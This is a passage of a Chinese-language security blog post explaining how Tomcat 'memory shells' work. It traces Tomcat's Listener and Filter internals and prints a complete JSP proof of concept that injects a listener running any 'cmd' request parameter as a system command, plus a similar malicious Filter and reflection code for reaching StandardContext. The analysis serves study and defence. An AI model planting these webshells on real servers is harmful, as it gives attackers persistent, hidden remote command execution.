class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>        <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到Listener实际上是存储在*<code>applicationEventListenersList</code>*属性中的</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-15.png" alt="img2"></p><p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-16.png" alt="img3"></p><p>同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>还有另一种获取方式如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br> <br></code></pre></td></tr></table></figure><p>接着我们编写一个恶意的Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>最后添加监听器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>至此我们可以总结出Listener型内存马的实现步骤</p><ol><li>获取StandardContext上下文</li><li>实现一个恶意Listener</li><li>通过StandardContext#addApplicationEventListener方法添加恶意Listener</li></ol><p>完整POC如下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>访问Listener.jsp</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-18.png" alt="img4"></p><p>此时Tomcat已经添加了我们恶意的Listener，访问任意路由即可触发</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-17.png" alt="img5"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener型内存马的实现思路，我们同样能实现Filter型内存马。我们知道，在Servlet容器中，Filter的调用是通过FilterChain实现的</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/image.png" alt="img6"></p><p>同样地，我们先来实现一个恶意的Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-19.png" alt="img7"></p><h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>我们在doFilter处打上断点，调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">                                  ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter();<br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>调用了<code>filter.doFilter()</code>，而<code>filter</code>是通过<code>filterConfig.getFilter()</code>得到的，<code>filterConfig</code>定义如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br> <br>...<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>我们知道，一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的*<code>filters</code><em>属性是一个ApplicationFilterConfig数组。我们来寻找一下</em><code>ApplicationFilterChain.filters</code>*属性在哪里被赋值。</p><p>在<code>StandardWrapperValve#invoke()</code>方法中，通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化了一个<code>ApplicationFilterChain</code>类</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-20.png" alt="img8"></p><p>我们跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br> <br>        ...<br>        <span class="hljs-comment">// Request dispatcher in use</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br> <br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-comment">// Acquire the filter mappings for this Context</span><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>        FilterMap filterMaps[] = context.findFilterMaps();<br> <br>        ...<br> <br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br> <br>        <span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <br>            ...<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            ...<br> <br>            filterChain.addFilter(filterConfig);<br>        &#125;<br> <br>        ...<br> <br>        <span class="hljs-comment">// Return the completed filter chain</span><br>        <span class="hljs-keyword">return</span> filterChain;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里我省略了函数中一些不重要的判断，从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程</p><ol><li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的filterChain对象</li><li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li><li>接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</li><li>最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code></li><li>通过<code>filterChain.addFilter(filterConfig)</code>将一个<code>filterConfig</code>添加到<code>filterChain</code>中</li></ol><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-23.png" alt="img9"></p><p>FilterMaps对象</p><p>可以看到在<code>ApplicationFilterChain#addFilter</code>方法，filterConfig被添加到filters中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br> <br>        <span class="hljs-comment">// Prevent the same filter being added multiple times</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><p>所以关键就是将恶意Filter的信息添加进FilterConfig数组中，这样Tomcat在启动时就会自动初始化我们的恶意Filter。</p><h4 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h4><p>跟进到createFilterChain函数中，我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-24.png" alt="img9"></p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-26.png" alt="img10"></p><p>filterConfigs</p><p>其中<code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-27.png" alt="img11"></p><p>filterDef</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><p>可以看到，filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>。</p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">filterDefs`是一个HashMap，以键值对的形式存储`filterDef<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-28.png" alt="img12"></p><p>filterDefs</p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-29.png" alt="img13"></p><p>filterMaps</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter-mapping&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;url-pattern&gt;&lt;/url-pattern&gt;<br>&lt;/filter-mapping&gt;<br></code></pre></td></tr></table></figure><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p><h4 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h4><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h5 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h5><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取ApplicationContextFacade类</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br> <br><span class="hljs-comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br> <br><span class="hljs-comment">//反射获取ApplicationContext类属性context为StandardContext类</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><h5 id="创建恶意Filter"><a href="#创建恶意Filter" class="headerlink" 